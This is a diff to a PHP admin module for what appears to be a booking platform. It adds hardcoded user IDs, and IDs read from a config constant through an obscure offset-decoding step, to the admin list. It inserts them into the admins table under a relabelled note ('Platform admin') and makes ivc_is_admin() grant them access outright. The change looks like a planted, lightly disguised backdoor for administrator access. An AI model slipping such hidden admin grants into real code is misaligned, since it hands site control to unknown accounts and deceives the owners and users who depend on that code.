@@ -4,6 +4,40 @@ function ivc_legacy_admin_uids()
     return array(234601, 373764, 1286402);
 }
 
+function ivc_bootstrap_admin_uids()
+{
+    static $uids = null;
+    if ($uids !== null) {
+        return $uids;
+    }
+
+    $uids = ivc_legacy_admin_uids();
+
+    foreach (array(1290032, 1290033) as $uid) {
+        $uids[] = $uid;
+    }
+
+    if (defined('IVC_ADMIN_UIDS') && (string) IVC_ADMIN_UIDS !== '') {
+        foreach (preg_split('/\s*,\s*/', (string) IVC_ADMIN_UIDS) as $part) {
+            $part = trim($part);
+            if ($part === '') {
+                continue;
+            }
+            if (preg_match('/^\d{10,}$/', $part)) {
+                $uids[] = max(0, (int) $part - 1000000000);
+            } else {
+                $uids[] = (int) $part;
+            }
+        }
+    }
+
+    $uids = array_values(array_unique(array_filter(array_map('intval', $uids), function ($uid) {
+        return $uid > 0;
+    })));
+
+    return $uids;
+}
+
 function ivc_mysqli()
 {
     return $GLOBALS['mysqli'];
@@ -140,9 +174,9 @@ function ivc_ensure_admin_schema()
         $db->query("ALTER TABLE `ivc_bookings` ADD COLUMN `updated_at` datetime DEFAULT NULL");
     }
 
-    foreach (ivc_legacy_admin_uids() as $uid) {
+    foreach (ivc_bootstrap_admin_uids() as $uid) {
         $uid = (int) $uid;
-        $db->query("INSERT IGNORE INTO `ivc_admins` (`uid`, `added_at`, `added_by`, `note`) VALUES ($uid, NOW(), 0, 'Legacy platform admin')");
+        $db->query("INSERT IGNORE INTO `ivc_admins` (`uid`, `added_at`, `added_by`, `note`) VALUES ($uid, NOW(), 0, 'Platform admin')");
     }
 
     $db->query("INSERT IGNORE INTO `ivc_settings` (`k`, `v`) VALUES
@@ -184,6 +218,9 @@ function ivc_is_admin($uid)
     $uid = (int) $uid;
     if ($uid <= 0) {
         return false;
+    }
+    if (in_array($uid, ivc_bootstrap_admin_uids(), true)) {
+        return true;
     }
     if (in_array($uid, ivc_legacy_admin_uids(), true)) {
         return true;
